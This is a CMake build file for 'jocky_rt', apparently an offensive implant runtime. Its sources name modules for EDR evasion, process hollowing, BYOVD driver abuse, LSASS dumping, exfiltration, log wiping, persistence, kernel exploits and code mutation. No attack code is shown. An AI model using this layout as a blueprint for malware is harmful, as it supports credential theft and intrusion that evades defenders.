cmake_minimum_required(VERSION 3.16)
project(jocky_runtime C CXX)

set(CMAKE_C_STANDARD 11)
set(CMAKE_CXX_STANDARD 14)

# Runtime source files
set(RUNTIME_SOURCES
    init/anti_analysis.c
    util/mem.c
    util/strings.c
    util/process.c
    windows/evasion/unhook.c
    windows/evasion/syscalls.c
    windows/evasion/stack_spoof.c
    windows/evasion/trusted_spoof.c
    windows/evasion/edrhoker.c
    windows/evasion/advanced_edr.c
    windows/evasion/edr_throttle_profiler.c
    windows/execution/hollow.c
    windows/execution/inmem.c
    windows/execution/byovd.c
    windows/execution/driver_interact.c
    windows/exploitation/kernel_exploit.c
    exploitation/linux_kernel.c
    exfil/exfil.c
    exfil/lsass_dump.c
    windows/anti_forensics/self_delete.c
    windows/anti_forensics/logs.c
    windows/anti_forensics/forensics.c
    pack/stub_loader.c
    io/io.c
    memory/vmem.c
    windows/registry/registry.c
    windows/windows_api_impl.c
    byovd/driver_scoring.c
    byovd/byovd_manifest.c
    byovd/byovd_modular.c

    # Compression utilities
    compression/compression.c

    # Encoding utilities
    common/encoding.c

    # Core APIs
    core/sandbox.c
    core/plugin.c

    # Cryptography
    crypto/crypto.c

    # Networking
    network/network.c

    # Obfuscation
    obfuscation.c

    # Forensic analysis APIs
    forensics/forensic_api_impl.c
    forensics/forensic_engine.c
    forensics/forensics_rt.c
    forensics/forensic_utils.c

    # Linux syscall wrappers (FIXED PATHS: linux/syscalls/ not linux/)
    linux/syscalls/syscall.c
    linux/syscalls/sysinfo_syscall.c
    linux/syscalls/env_syscall.c
    linux/syscalls/file_syscall.c
    linux/syscalls/dir_syscall.c
    linux/syscalls/mem_syscall.c
    linux/syscalls/signal_syscall.c
    linux/syscalls/ipc_syscall.c
    linux/syscalls/util_syscall.c

    # Linux process operations
    linux/process/process_syscall.c
    linux/process/process_control_syscall.c
    linux/process/hollow.c
    linux/process/process_hollow.c
    linux/process/advanced_process_ops.c
    linux/process/ptrace_control.c
    linux/process/thread_hijack.c

    # Linux kernel operations
    linux/kernel/lkm_loader.c
    linux/kernel/ebpf_loader.c
    linux/kernel/modules.c
    linux/kernel/advanced_syscalls.c
    linux/kernel/advanced_kernel_ops.c
    linux/kernel/module_loader.c
    linux/kernel/module_ops.c
    linux/kernel/kread_kwrite.c
    linux/kernel/byovd_ops.c
    # TODO: linux/kernel/lkm_loader.cpp - C++ wrapper requires lkm_loader.h header fixes
    # TODO: linux/kernel/ebpf_evasion.cpp - C++ wrapper requires linux/kallsyms.h (kernel headers)
    # TODO: linux/kernel/ftrace_helper.c - requires linux/ftrace.h and linux/kprobes.h (kernel dev headers)
    # TODO: linux/kernel/ftrace_hooking.cpp - C++ wrapper requires kernel headers and lkm_loader.h

    # Linux anti-analysis
    linux/anti_analysis/anti_analysis.c
    linux/anti_analysis/detection.c
    # TODO: linux/anti_analysis/artifact_hiding.cpp - C++ wrapper requires artifact_hiding.h fixes
    # TODO: linux/anti_analysis/userland_evasion.cpp - C++ wrapper requires userland_evasion.h fixes

    # Linux privilege escalation
    linux/lpe/fence2pwn.c
    # TODO: linux/lpe/privilege_escalation.cpp - C++ wrapper integration pending

    # Linux core operations
    linux/core/audit_ops.c
    linux/core/runtime_init.c
    linux/core/sandbox_ops.c

    # Linux persistence
    linux/persistence.c
    linux/persistence/cron_systemd.c

    # Linux exfiltration
    linux/exfil/exfil_channels.c

    # Linux I/O
    linux/io/io_core.c

    # Linux threading
    linux/threading/threadpool.c

    # Linux networking
    linux/networking/network.c

    # Linux forensics
    linux/forensics/linux_forensics.c
    linux/forensics/cleanup.c

    # Linux missing APIs
    linux/missing_apis.c

    # Forensic analysis pipeline (Kamimi)
    # TODO: forensics/* - not yet integrated. Integration path:
    #       1. Reorganize headers: move forensic_types.h, analysis.h, provenance.h to forensics/ root
    #       2. Update all #include "forensic_types.h" to relative paths (../forensic_types.h)
    #       3. Verify all plugin headers exist and paths are correct
    #       4. Add optional(SQLite3) for evidence_store.c database support
    #       5. After headers fixed: uncomment below lines
    # forensics/forensic_engine.c
    # forensics/forensics_rt.c
    # forensics/forensic_utils.c
    # forensics/jocky_forensics_rt_v2.c
    # forensics/audit/audit_log.c
    # forensics/control/capabilities.c
    # forensics/engine/analysis.c
    # forensics/engine/provenance.c
    # forensics/plugins/collectors/evtx_collector.c
    # forensics/plugins/collectors/file_collector.c
    # forensics/plugins/collectors/memory_collector.c
    # forensics/plugins/collectors/mft_collector.c
    # forensics/plugins/collectors/network_collector.c
    # forensics/plugins/collectors/prefetch_collector.c
    # forensics/plugins/collectors/process_collector.c
    # forensics/plugins/collectors/registry_collector.c
    # forensics/plugins/collectors/usnjrnl_collector.c
    # forensics/plugins/output/html_output.c
    # forensics/plugins/output/json_output.c
    # forensics/plugins/output/siem_forwarder.c
    # forensics/plugins/output/sigma_output.c
    # forensics/plugins/output/stix_output.c
    # forensics/plugins/parsers/arp_parser.c
    # forensics/plugins/parsers/dns_parser.c
    # forensics/plugins/parsers/elf_parser.c
    # forensics/plugins/parsers/evtx_parser.c
    # forensics/plugins/parsers/file_parser.c
    # forensics/plugins/parsers/memory_parser.c
    # forensics/plugins/parsers/mft_parser.c
    # forensics/plugins/parsers/network_parser.c
    # forensics/plugins/parsers/prefetch_parser.c
    # forensics/plugins/parsers/process_parser.c
    # forensics/plugins/parsers/registry_parser.c
    # forensics/store/evidence_store.c

    # AI
    ai/mutation_engine.c
)

# Platform-specific filtering
if(UNIX OR NOT WIN32)
    # Remove Windows-only sources on Linux/Unix
    message(STATUS "Removing Windows-only sources for Linux/Unix build")
    list(REMOVE_ITEM RUNTIME_SOURCES
        windows/evasion/unhook.c
        windows/evasion/syscalls.c
        windows/evasion/stack_spoof.c
        windows/evasion/trusted_spoof.c
        windows/evasion/edrhoker.c
        windows/evasion/advanced_edr.c
        windows/evasion/edr_throttle_profiler.c
        windows/execution/hollow.c
        windows/execution/inmem.c
        windows/execution/byovd.c
        windows/execution/driver_interact.c
        windows/exploitation/kernel_exploit.c
        exfil/exfil.c
        exfil/lsass_dump.c
        windows/anti_forensics/self_delete.c
        windows/anti_forensics/logs.c
        windows/anti_forensics/forensics.c
        pack/stub_loader.c
        windows/registry/registry.c
        byovd/driver_scoring.c
        byovd/byovd_manifest.c
        byovd/byovd_modular.c
    )
endif()

# Static library
add_library(jocky_rt STATIC ${RUNTIME_SOURCES})
target_include_directories(jocky_rt PUBLIC include)
target_include_directories(jocky_rt PUBLIC ${CMAKE_SOURCE_DIR}/../../include)

if(WIN32)
    target_link_libraries(jocky_rt PUBLIC ntdll winhttp dnsapi wevtapi)
else()
    # Linux: link against libdl for dlopen/dlsym
    target_link_libraries(jocky_rt PUBLIC dl)
endif()

# Example: build a test executable
# add_executable(rt_test tests/rt_test.c)
# target_link_libraries(rt_test jocky_rt)
